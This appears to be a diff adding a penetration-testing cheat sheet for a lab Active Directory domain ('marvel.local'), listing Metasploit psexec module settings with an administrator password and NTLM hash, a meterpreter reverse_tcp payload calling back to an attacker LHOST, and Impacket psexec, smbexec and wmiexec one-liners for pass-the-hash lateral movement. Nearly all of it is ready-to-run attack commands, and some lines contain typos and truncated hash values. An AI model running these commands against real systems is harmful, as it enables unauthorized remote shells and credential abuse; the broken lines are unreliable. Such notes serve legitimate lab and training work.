@@ -1,0 +1,48 @@
+
+-- msfconsole --
+
+msfconsole     
+msf6 > search psexec
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > options
+msf6 exploit(windows/smb/psexec) > set rhost 192.168.233.130
+msf6 exploit(windows/smb/psexec) > set smbdomain marvel.local
+msf6 exploit(windows/smb/psexec) > set smbuser administrator  
+msf6 exploit(windows/smb/psexec) > set smbpass Password1
+msf6 exploit(windows/smb/psexec) > options
+
+msf6 exploit(windows/smb/psexec) > show targets
+msf6 exploit(windows/smb/psexec) > set target 2
+msf6 exploit(windows/smb/psexec) > run
+
+msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/psexec) > set LHOST 192.168.233.128
+msf6 exploit(windows/smb/psexec) > exploit
+
+
+msf6 exploit(windows/smb/psexec) > set smbdomain marvel.local 
+msf6 exploit(windows/smb/psexec) > set smbuser administrator  
+msf6 exploit(windows/smb/psexec) > unset smbdomain  
+msf6 exploit(windows/smb/psexec) > set smbpass aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3
+msf6 exploit(windows/smb/psexec) > options
+msf6 exploit(windows/smb/psexec) > exploit
+
+
+-- psexec --
+
+psexec.py marvel.local/fcastle:'Password1'@192.168.233.130
+psexec.py administartor@10.0.0.25 -hashes aad3c435b514a4eeaad3b935b51304fe
+
+
+-- smbexec --
+
+smbexec.py marvel.local/fcastle:Password1@192.168.75.141
+smbexec.py administartor@10.0.0.25 -hashes aad3c435b514a4eeaad3b935b51304fe
+
+
+-- wmiexec --
+
+wmiexec.py marvel.local/fcastle:Password1@192.168.233.130
+wmiexec.py administartor@10.0.0.25 -hashes aad3c435b514a4eeaad3b935b51304fe
+
+
